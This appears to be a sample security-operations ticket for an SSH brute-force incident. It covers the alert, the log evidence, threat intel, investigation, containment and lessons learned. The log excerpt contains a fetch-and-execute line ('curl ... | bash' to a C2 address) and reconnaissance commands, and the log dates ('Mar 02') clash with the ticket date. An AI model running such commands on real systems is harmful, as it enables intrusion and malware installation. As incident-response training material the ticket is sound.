# Sample Ticket: SIEM-2024-0198 — SSH Brute Force → Successful Login

**Status:** Closed — True Positive, Incident Escalated  
**Analyst:** Koushik Gaini  
**Date/Time:** 2024-04-02 03:14 UTC  
**SLA Target:** P2 — 1 hour  
**Resolution Time:** 47 minutes  

---

## Alert Details

**Alert Name:** `NET-BF-002 — SSH Brute Force Followed by Successful Authentication`  
**SIEM Rule ID:** `SSH-BF-SUCCESS-CRITICAL`  
**Source:** Linux syslog (PROD-WEB-07)  
**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing → T1078 — Valid Accounts

---

## Affected Assets

| Field | Value |
|-------|-------|
| Target Host | PROD-WEB-07 (10.10.1.47) |
| Compromised Account | `deploy` (service account) |
| Asset Criticality | **HIGH** — Public-facing web server, production environment |
| Attacker IP | 185.220.101.47 (Tor exit node — DE) |

---

## Raw Alert Evidence

**Brute Force Phase (03:01–03:13 UTC):**
```
Mar 02 03:01:14 PROD-WEB-07 sshd[4421]: Failed password for deploy from 185.220.101.47 port 41202 ssh2
Mar 02 03:01:16 PROD-WEB-07 sshd[4422]: Failed password for deploy from 185.220.101.47 port 41204 ssh2
[... 847 similar lines over 12 minutes ...]
Mar 02 03:13:58 PROD-WEB-07 sshd[5109]: Failed password for deploy from 185.220.101.47 port 44892 ssh2
```

**Successful Login (03:14 UTC):**
```
Mar 02 03:14:02 PROD-WEB-07 sshd[5110]: Accepted password for deploy from 185.220.101.47 port 44894 ssh2
Mar 02 03:14:02 PROD-WEB-07 sshd[5110]: pam_unix(sshd:session): session opened for user deploy
```

**Post-Login Activity (03:14–03:19 UTC):**
```
Mar 02 03:14:09 PROD-WEB-07 sudo: deploy : command not found in sudoers ; ...
Mar 02 03:14:21 PROD-WEB-07 bash: history: /home/deploy/.bash_history (opened for writing)
Mar 02 03:15:03 PROD-WEB-07 cron[5180]: (deploy) CMD (curl -s http://45.142.212.100/update.sh | bash)
```

---

## Threat Intel

| IOC | Type | Verdict |
|-----|------|---------|
| `185.220.101.47` | IPv4 | Tor exit node — AbuseIPDB score 100/100, 847 reports |
| `45.142.212.100` | IPv4 | C2 server — VirusTotal 22/87 malicious |
| `http://45.142.212.100/update.sh` | URL | Malware dropper — URLhaus: active |

---

## Investigation Steps

**Step 1 — Confirm active session**  
`who` command output (via EDR remote shell):
```
deploy   pts/0  2024-04-02 03:14 (185.220.101.47)
```
Session still active at time of investigation.

**Step 2 — Assess post-exploitation activity**  
Reviewed bash history and process list:
- Attacker ran `id`, `uname -a`, `cat /etc/passwd` (reconnaissance)
- Executed curl command to download and run `update.sh` from external C2
- `update.sh` attempted to install a cron-based reverse shell (blocked by egress firewall)
- No successful outbound connection to C2 confirmed

**Step 3 — Account review**  
- `deploy` account had password authentication enabled (should be key-only)
- Password: `deploy123` — found in Have I Been Pwned database (RockYou2021 list)
- Account had write access to `/var/www/html` (web root) — risk of web shell

**Step 4 — Scope check**  
- No lateral movement detected from PROD-WEB-07 to other hosts
- Web root files unchanged (MD5 baseline comparison confirmed)
- No new cron jobs successfully persisted

---

## Verdict

**True Positive — Active Compromise (Contained)**  
Attacker gained SSH access via credential brute force and attempted to install a backdoor. Egress firewall blocked the C2 callback. No persistent access was achieved, but the host must be treated as compromised.

---

## Actions Taken

### Immediate (03:17 UTC)
1. **Escalated to IR team** — Paged on-call IR lead (P2 escalation).
2. **Terminated active SSH session** via EDR: `kill -9 [PID]`
3. **Blocked attacker IP** at perimeter firewall: `185.220.101.47/32`
4. **Blocked C2 IP** at perimeter firewall: `45.142.212.100/32`

### Short-Term (Within 4 hours)
5. **Locked `deploy` account** — `passwd -l deploy`
6. **Rotated credentials** — Issued new SSH key pair for `deploy` service account
7. **Disabled password auth** — Updated `/etc/ssh/sshd_config`: `PasswordAuthentication no`
8. **Web root integrity check** — No web shells found; integrity baseline reset

### Follow-Up (Next 48 hours)
9. **Audit all Linux hosts** for password-based SSH auth — policy enforcement gap
10. **Implement SSH allowlist** — restrict SSH to jump host / VPN IP range only
11. **Review `deploy` account permissions** — principle of least privilege audit
12. **Threat hunt** — Check all hosts for connections to `45.142.212.100`

---

## Timeline

| Time (UTC) | Event |
|-----------|-------|
| 03:01 | Brute force begins from Tor exit node |
| 03:14 | Successful authentication — `deploy` account |
| 03:14 | Attacker runs recon commands |
| 03:15 | Curl/bash C2 dropper executed (blocked by egress FW) |
| 03:17 | SIEM alert fires, analyst assigned |
| 03:19 | Attacker session terminated |
| 03:22 | Attacker IP + C2 blocked at firewall |
| 03:58 | P2 IR escalation closed — no persistent access |

---

## Disposition

**Escalated → Closed** — No persistent compromise. IR team confirmed clean. Remediation steps tracked in JIRA-SEC-0892.

## Lessons Learned

- Service accounts must enforce key-based SSH only — password auth is a critical gap.
- Weak/default passwords on service accounts remain the #1 initial access vector.
- Consider fail2ban or AWS WAF SSH rate limiting as a secondary control.
- Tor exit nodes should be blocked by default at the perimeter.
